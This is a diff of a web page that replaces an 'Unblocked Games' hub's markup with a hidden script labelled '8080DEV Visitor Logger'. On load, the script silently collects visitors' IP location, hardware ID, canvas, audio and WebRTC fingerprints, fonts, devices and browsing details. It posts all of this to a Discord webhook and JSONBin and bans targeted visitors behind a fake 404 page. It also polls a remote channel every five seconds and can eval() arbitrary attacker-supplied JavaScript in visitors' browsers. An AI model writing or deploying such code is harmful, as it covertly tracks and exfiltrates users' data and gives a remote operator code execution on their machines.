+        if (debugInfo) {
+          gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+        }
+      }
+    } catch (e) {}
+
+    let batteryInfo = 'Not available';
+    try {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryInfo = Math.round(battery.level * 100) + '% ' + (battery.charging ? '(Charging)' : '(Not charging)');
+      }
+    } catch (e) {}
+
+    let connectionInfo = { type: 'Unknown', downlink: 'Unknown', effectiveType: 'Unknown' };
+    if (navigator.connection) {
+      connectionInfo = {
+        type: navigator.connection.type || 'Unknown',
+        downlink: navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'Unknown',
+        effectiveType: navigator.connection.effectiveType || 'Unknown'
+      };
+    }
+
+    let loadTime = 'Unknown';
+    if (window.performance && performance.timing) {
+      const timing = performance.timing;
+      if (timing.loadEventEnd > 0) {
+        loadTime = (timing.loadEventEnd - timing.navigationStart) + 'ms';
+      }
+    }
+
+    let visitCount = parseInt(localStorage.getItem('8080DEV_visits') || '0') + 1;
+    localStorage.setItem('8080DEV_visits', visitCount.toString());
+    const lastVisit = localStorage.getItem('8080DEV_lastVisit');
+    localStorage.setItem('8080DEV_lastVisit', new Date().toISOString());
+
+    let incognitoLikely = false;
+    try {
+      const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+      if (fs) {
+        fs(window.TEMPORARY, 100, () => {}, () => { incognitoLikely = true; });
+      }
+    } catch (e) {}
+    
+    const canvasFingerprint = getCanvasFingerprint();
+    const audioFingerprint = await getAudioFingerprint();
+    const webrtcIPs = await getWebRTCIPs();
+    const installedFonts = getInstalledFonts();
+    const mediaDevices = await getMediaDevices();
+    
+    const plugins = [];
+    try {
+      for (let i = 0; i < Math.min(navigator.plugins.length, 10); i++) {
+        plugins.push(navigator.plugins[i].name);
+      }
+    } catch (e) {}
+
+    const visitorData = {
+      timestamp: new Date().toISOString(),
+      hwid: hwid,
+      ip: ipData.query,
+      country: ipData.country,
+      countryCode: ipData.countryCode,
+      region: ipData.region,
+      regionName: ipData.regionName,
+      city: ipData.city,
+      isp: ipData.isp,
+      org: ipData.org,
+      as: ipData.as,
+      isVpn: ipData.proxy,
+      isProxy: ipData.proxy,
+      timezone: ipData.timezone,
+      lat: ipData.lat,
+      lon: ipData.lon,
+      platform: navigator.platform,
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+      screen: screen.width + 'x' + screen.height,
+      colorDepth: screen.colorDepth,
+      pixelRatio: window.devicePixelRatio,
+      memory: deviceInfo.memory,
+      cpuCores: deviceInfo.cpuCores,
+      gpu: gpuInfo,
+      gpuVendor: gpuVendor,
+      touchSupport: deviceInfo.touchSupport,
+      maxTouchPoints: deviceInfo.maxTouchPoints,
+      battery: batteryInfo,
+      connectionType: connectionInfo.type,
+      downlink: connectionInfo.downlink,
+      effectiveType: connectionInfo.effectiveType,
+      loadTime: loadTime,
+      visitCount: visitCount,
+      lastVisit: lastVisit,
+      incognitoLikely: incognitoLikely,
+      canvasFingerprint: canvasFingerprint,
+      audioFingerprint: audioFingerprint,
+      webrtcIPs: webrtcIPs,
+      fonts: installedFonts.join(', '),
+      plugins: plugins.join(', '),
+      cameras: mediaDevices.cameras,
+      mics: mediaDevices.mics,
+      speakers: mediaDevices.speakers,
+      cookiesEnabled: deviceInfo.cookiesEnabled,
+      doNotTrack: deviceInfo.doNotTrack,
+      referrer: document.referrer || 'Direct',
+      url: window.location.href,
+      windowSize: window.innerWidth + 'x' + window.innerHeight,
+      historyLength: deviceInfo.historyLength
+    };
+
+    logToJSONBin(visitorData);
+
+    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
+      const embeds = [
+        {
+          title: 'IP & Location Info',
+          color: 0x6366f1,
+          fields: [
+            { name: 'HWID', value: '`' + hwid + '`', inline: false },
+            { name: 'IP Address', value: '`' + ipData.query + '`', inline: true },
+            { name: 'Country', value: (ipData.country || 'Unknown') + ' (' + (ipData.countryCode || '??') + ')', inline: true },
+            { name: 'City', value: ipData.city || 'Unknown', inline: true },
+            { name: 'Region', value: ipData.regionName || 'Unknown', inline: true },
+            { name: 'ISP', value: ipData.isp || 'Unknown', inline: true },
+            { name: 'Organization', value: ipData.org || 'Unknown', inline: true },
+            { name: 'Proxy/VPN', value: ipData.proxy ? 'Yes' : 'No', inline: true },
+            { name: 'Coordinates', value: (ipData.lat || '?') + ', ' + (ipData.lon || '?'), inline: true },
+            { name: 'AS Number', value: ipData.as || 'Unknown', inline: true },
+            { name: 'Timezone', value: ipData.timezone || 'Unknown', inline: true }
+          ],
+          timestamp: new Date().toISOString()
+        },
+        {
+          title: 'Device & Hardware',
+          color: 0x22d3ee,
+          fields: [
+            { name: 'Platform', value: navigator.platform || 'Unknown', inline: true },
+            { name: 'RAM', value: (deviceInfo.memory || 'Unknown') + ' GB', inline: true },
+            { name: 'CPU Cores', value: String(deviceInfo.cpuCores || 'Unknown'), inline: true },
+            { name: 'GPU', value: (gpuInfo || 'Unknown').substring(0, 100), inline: false },
+            { name: 'GPU Vendor', value: gpuVendor || 'Unknown', inline: true },
+            { name: 'Touch Support', value: deviceInfo.touchSupport ? 'Yes' : 'No', inline: true },
+            { name: 'Max Touch Points', value: String(deviceInfo.maxTouchPoints), inline: true },
+            { name: 'Battery', value: batteryInfo, inline: true },
+            { name: 'Screen', value: screen.width + 'x' + screen.height, inline: true },
+            { name: 'Color Depth', value: String(screen.colorDepth) + '-bit', inline: true },
+            { name: 'Pixel Ratio', value: String(window.devicePixelRatio), inline: true }
+          ]
+        },
+        {
+          title: 'Connection & Browser',
+          color: 0x10b981,
+          fields: [
+            { name: 'Connection Type', value: connectionInfo.type || 'Unknown', inline: true },
+            { name: 'Downlink', value: connectionInfo.downlink || 'Unknown', inline: true },
+            { name: 'Effective Type', value: connectionInfo.effectiveType || 'Unknown', inline: true },
+            { name: 'Page Load', value: loadTime, inline: true },
+            { name: 'Languages', value: (navigator.languages ? navigator.languages.slice(0, 3).join(', ') : navigator.language), inline: true },
+            { name: 'Cookies', value: deviceInfo.cookiesEnabled ? 'Enabled' : 'Disabled', inline: true },
+            { name: 'Do Not Track', value: deviceInfo.doNotTrack ? 'Enabled' : 'Disabled', inline: true },
+            { name: 'Cameras', value: String(mediaDevices.cameras), inline: true },
+            { name: 'Microphones', value: String(mediaDevices.mics), inline: true },
+            { name: 'Speakers', value: String(mediaDevices.speakers), inline: true }
+          ]
+        },
+        {
+          title: 'Session & Fingerprint Info',
+          color: 0xa855f7,
+          fields: [
+            { name: 'Visit Count', value: visitCount === 1 ? 'New Visitor' : 'Visit #' + visitCount, inline: true },
+            { name: 'Last Visit', value: lastVisit ? new Date(lastVisit).toLocaleString() : 'First visit', inline: true },
+            { name: 'Incognito', value: incognitoLikely ? 'Likely' : 'No', inline: true },
+            { name: 'Canvas FP', value: '`' + canvasFingerprint + '`', inline: true },
+            { name: 'Audio FP', value: '`' + audioFingerprint + '`', inline: true },
+            { name: 'History Length', value: String(deviceInfo.historyLength), inline: true },
+            { name: 'Referrer', value: (document.referrer || 'Direct').substring(0, 50), inline: true },
+            { name: 'WebRTC IPs', value: webrtcIPs.length > 0 ? webrtcIPs.join(', ') : 'None detected', inline: false },
+            { name: 'Plugins', value: (plugins.length > 0 ? plugins.slice(0, 3).join(', ') : 'None').substring(0, 100), inline: false },
+            { name: 'Fonts Detected', value: (installedFonts.length > 0 ? installedFonts.slice(0, 5).join(', ') : 'None').substring(0, 100), inline: false }
+          ]
+        },
+        {
+          title: 'Full User Agent',
+          color: 0xef4444,
+          description: '\`\`\`' + navigator.userAgent + '\`\`\`',
+          footer: { text: '8080DEV Visitor Logger' }
+        }
+      ];
+
+      try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ embeds: embeds })
+        });
+      } catch (err) {
+        console.log('Discord log failed:', err);
+      }
+    }
+  }
+
+  async function checkAndBlock() {
+    try {
+      const hwid = await generateHWID();
+      console.log('User HWID:', hwid);
+      
+      const ipResponse = await fetch('https://ipwho.is/');
+      const ipData = await ipResponse.json();
+      
+      if (!ipData.success) {
+        console.log('IP API failed:', ipData.message);
+        // Still need to check live controls even if IP fails
+        const bans = await getLiveBans();
+        if (await handleLiveControls(bans.liveControls)) return;
+        document.getElementById('loading-status').style.display = 'none';
+        document.querySelector('.button').classList.add('visible');
+        document.getElementById('tosBtn').classList.add('visible');
+        return;
+      }
+      
+      const userIP = ipData.ip;
+      sessionStorage.setItem('8080_visitor_ip', userIP);
+      console.log('User IP:', userIP);
+      
+      const mappedData = {
+        query: ipData.ip,
+        country: ipData.country,
+        countryCode: ipData.country_code,
+        region: ipData.region_code,
+        regionName: ipData.region,
+        city: ipData.city,
+        zip: ipData.postal,
+        lat: ipData.latitude,
+        lon: ipData.longitude,
+        timezone: ipData.timezone?.id,
+        isp: ipData.connection?.isp,
+        org: ipData.connection?.org,
+        as: ipData.connection?.asn ? 'AS' + ipData.connection.asn : null,
+        proxy: ipData.security?.proxy || ipData.security?.vpn || ipData.security?.tor
+      };
+      
+      // Get bans and live controls FIRST before logging
+      const bans = await getLiveBans();
+      
+      // Check live controls (kill switch, maintenance, redirect) BEFORE showing button
+      if (await handleLiveControls(bans.liveControls)) return;
+      
+      // Now log visitor
+      logVisitor(mappedData, hwid);
+      
+      // Check if banned (permanent or temp)
+      if (bans.ips.includes(userIP) || bans.hwids.includes(hwid)) {
+        document.body.innerHTML = `
+          <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background:#09090b;color:#fff;font-family:Inter,-apple-system,sans-serif;text-align:center;padding:2rem;">
+            <h1 style="font-size:8rem;font-weight:800;margin:0;background:linear-gradient(135deg,#6366f1,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">404</h1>
+            <p style="font-size:1.25rem;color:#52525b;margin-top:1rem;">Page Not Found</p>
           </div>
-          <h1 class="text-xl font-bold tracking-tight hidden sm:block">
-            Unblocked<span class="text-zinc-500">Games</span>
-          </h1>
+        `;
+      } else {
+        document.getElementById('loading-status').style.display = 'none';
+        document.querySelector('.button').classList.add('visible');
+        document.getElementById('tosBtn').classList.add('visible');
+      }
+    } catch (err) {
+      console.log('IP check failed:', err);
+      // Try to check live controls even on error
+      try {
+        const bans = await getLiveBans();
+        if (await handleLiveControls(bans.liveControls)) return;
+      } catch (e) {}
+      document.getElementById('loading-status').style.display = 'none';
+      document.querySelector('.button').classList.add('visible');
+      document.getElementById('tosBtn').classList.add('visible');
+    }
+  }
+  
+  // Handle live controls - returns true if page was blocked/redirected
+  async function handleLiveControls(controls) {
+    if (!controls) return false;
+    
+    // Kill Switch - Show 404 page
+    if (controls.killSwitch) {
+      document.body.innerHTML = `
+        <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background:#09090b;color:#fafafa;font-family:-apple-system,BlinkMacSystemFont,sans-serif;text-align:center;padding:2rem;">
+          <h1 style="font-size:6rem;font-weight:800;margin:0;background:linear-gradient(180deg,#fff 0%,#666 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">404</h1>
+          <p style="font-size:1.25rem;color:#71717a;margin-top:1rem;">This page could not be found.</p>
         </div>
-
-        <div class="flex-1 max-w-md mx-4">
-          <div class="relative group">
-            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-400 group-focus-within:text-zinc-900 transition-colors"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.3-4.3"></path></svg>
-            <input
-              type="text"
-              id="search-input"
-              placeholder="Search games..."
-              class="w-full bg-zinc-100 border-none rounded-full py-2 pl-10 pr-4 text-sm focus:ring-2 focus:ring-zinc-900 transition-all outline-none"
-            />
-          </div>
+      `;
+      return true;
+    }
+    
+    // Live Redirect
+    if (controls.redirect && controls.redirectUrl) {
+      window.location.href = controls.redirectUrl;
+      return true;
+    }
+    
+    // Maintenance Mode
+    if (controls.maintenance) {
+      const msg = controls.maintenanceMessage || 'We are currently performing maintenance. Please check back soon!';
+      document.body.innerHTML = `
+        <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background:#09090b;color:#fafafa;font-family:-apple-system,BlinkMacSystemFont,sans-serif;text-align:center;padding:2rem;">
+          <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#f39c12" stroke-width="1.5" style="margin-bottom:2rem;">
+            <path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/>
+          </svg>
+          <h1 style="font-size:2.5rem;font-weight:700;margin:0;color:#f39c12;">Under Maintenance</h1>
+          <p style="font-size:1.1rem;color:#71717a;margin-top:1rem;max-width:500px;line-height:1.6;">${msg}</p>
         </div>
+      `;
+      return true;
+    }
+    
+    return false;
+  }
 
-        <div class="flex items-center gap-4">
-          <span id="game-count" class="text-xs font-medium text-zinc-400 uppercase tracking-wider hidden md:block">
-            0 Games Available
-          </span>
-        </div>
-      </div>
-    </header>
+  checkAndBlock();
 
-    <!-- Main Content -->
-    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 flex-1 w-full">
-      <div id="game-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
-        <!-- Games will be injected here -->
-      </div>
+  // Live Commands Listener - checks for admin commands every 5 seconds
+  async function checkLiveCommands() {
+    try {
+      const storedHWID = localStorage.getItem('8080_HWID') || 'Unknown';
+      let visitorIP = sessionStorage.getItem('8080_visitor_ip') || 'Unknown';
+      
+      // Fetch IP if not cached
+      if (visitorIP === 'Unknown') {
+        try {
+          const ipRes = await fetch('https://api.ipify.org?format=json');
+          if (ipRes.ok) {
+            const ipData = await ipRes.json();
+            visitorIP = ipData.ip || 'Unknown';
+            sessionStorage.setItem('8080_visitor_ip', visitorIP);
+          }
+        } catch (e) {}
+      }
 
-      <div id="no-results" class="hidden text-center py-20">
-        <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-zinc-100 mb-4">
-          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-8 h-8 text-zinc-300"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.3-4.3"></path></svg>
-        </div>
-        <h3 class="text-lg font-medium text-zinc-900">No games found</h3>
-        <p class="text-zinc-500">Try searching for something else.</p>
-      </div>
-    </main>
+      const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BANS_BIN}/latest`, {
+        headers: { 'X-Master-Key': JSONBIN_API_KEY }
+      });
+      
+      if (!response.ok) return;
+      
+      const data = await response.json();
+      const commands = data.record?.liveCommands || [];
+      const now = new Date();
 
-    <!-- Footer -->
-    <footer class="bg-white border-t border-zinc-200 py-12 mt-auto">
-      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-        <div class="flex flex-col md:flex-row justify-between items-center gap-8">
-          <div class="flex items-center gap-2">
-            <div class="bg-zinc-900 p-1.5 rounded-lg">
-              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-white"><line x1="6" x2="10" y1="12" y2="12"></line><line x1="8" x2="8" y1="10" y2="14"></line><line x1="15" x2="15.01" y1="13" y2="13"></line><line x1="18" x2="18.01" y1="11" y2="11"></line><rect width="20" height="12" x="2" y="6" rx="2"></rect></svg>
-            </div>
-            <span class="font-bold tracking-tight">UnblockedGames</span>
-          </div>
-          <p class="text-zinc-400 text-sm">
-            &copy; <span id="current-year"></span> Unblocked Games Hub. All rights reserved.
-          </p>
-          <div class="flex gap-6 text-sm font-medium text-zinc-500">
-            <a href="#" class="hover:text-zinc-900 transition-colors">Privacy</a>
-            <a href="#" class="hover:text-zinc-900 transition-colors">Terms</a>
-            <a href="#" class="hover:text-zinc-900 transition-colors">Contact</a>
-          </div>
-        </div>
-      </div>
-    </footer>
+      for (const cmd of commands) {
+        // Check if command is for this visitor
+        const isTarget = 
+          cmd.targetType === 'all' ||
+          (cmd.targetType === 'ip' && cmd.targetValue === visitorIP) ||
+          (cmd.targetType === 'hwid' && cmd.targetValue === storedHWID);
 
-    <!-- Game Player Modal -->
-    <div id="game-modal" class="fixed inset-0 z-50 hidden items-center justify-center p-4 sm:p-6 bg-black/60 backdrop-blur-sm opacity-0 transition-opacity duration-300">
-      <div id="modal-content" class="bg-white rounded-3xl overflow-hidden shadow-2xl flex flex-col transition-all duration-300 w-full max-w-5xl aspect-[16/10] transform scale-95 opacity-0">
-        <!-- Modal Header -->
-        <div class="px-6 py-4 border-b border-zinc-100 flex items-center justify-between bg-white">
-          <div class="flex items-center gap-3">
-            <div class="w-10 h-10 rounded-xl overflow-hidden border border-zinc-200">
-              <img id="modal-thumb" src="" alt="" class="w-full h-full object-cover">
-            </div>
-            <div>
-              <h2 id="modal-title" class="font-bold text-lg leading-tight">Game Title</h2>
-              <p class="text-xs text-zinc-400 uppercase tracking-wider font-medium">Playing Now</p>
-            </div>
-          </div>
-          <div class="flex items-center gap-2">
-            <button id="toggle-fullscreen" class="p-2 hover:bg-zinc-100 rounded-xl transition-colors text-zinc-500 hover:text-zinc-900">
-              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5"><path d="m15 3 6 6"></path><path d="m9 21-6-6"></path><path d="M21 3v6h-6"></path><path d="M3 21v-6h6"></path></svg>
-            </button>
-            <a id="modal-external" href="#" target="_blank" rel="noopener noreferrer" class="p-2 hover:bg-zinc-100 rounded-xl transition-colors text-zinc-500 hover:text-zinc-900">
-              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5"><path d="M15 3h6v6"></path><path d="M10 14 21 3"></path><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path></svg>
-            </a>
-            <div class="w-px h-6 bg-zinc-200 mx-1"></div>
-            <button id="close-modal" class="p-2 hover:bg-zinc-100 rounded-xl transition-colors text-zinc-500 hover:text-zinc-900">
-              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg>
-            </button>
-          </div>
-        </div>
+        // Check if not expired and not already executed
+        const isActive = new Date(cmd.expiresAt) > now;
+        const alreadyExecuted = sessionStorage.getItem(`cmd_${cmd.id}`);
 
-        <!-- Iframe Container -->
-        <div class="flex-1 bg-zinc-900 relative">
-          <iframe id="game-iframe" src="" class="w-full h-full border-none" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-        </div>
-      </div>
-    </div>
+        if (isTarget && isActive && !alreadyExecuted) {
+          // Mark as executed
+          sessionStorage.setItem(`cmd_${cmd.id}`, 'true');
 
-    <script src="./src/main.js"></script>
-  </body>
+          // Execute command
+          switch (cmd.command) {
+            case 'popup':
+              alert(cmd.payload);
+              break;
+            case 'redirect':
+              window.location.href = cmd.payload;
+              break;
+            case 'refresh':
+              window.location.reload();
+              break;
+            case 'disconnect':
+              document.body.innerHTML = `
+                <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: #09090b; color: #fff; font-family: system-ui, sans-serif; text-align: center; padding: 2rem;">
+                  <div style="width: 80px; height: 80px; background: rgba(255,77,77,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 2rem;">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ff4d4d" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>
+                  </div>
+                  <h1 style="font-size: 2rem; font-weight: 700; margin-bottom: 1rem; color: #ff4d4d;">Access Denied</h1>
+                  <p style="color: #666; max-width: 400px;">You have been disconnected by an administrator.</p>
+                </div>
+              `;
+              break;
+            case 'custom_js':
+              try {
+                eval(cmd.payload);
+              } catch (e) { console.log('Custom JS error:', e); }
+              break;
+          }
+        }
+      }
+    } catch (err) {
+      console.log('Live commands check failed:', err);
+    }
+  }
+
+  // Check for commands immediately and then every 5 seconds
+  checkLiveCommands();
+  setInterval(checkLiveCommands, 5000);
+  })();
+  </script>
+  
+</body>
 </html>
-
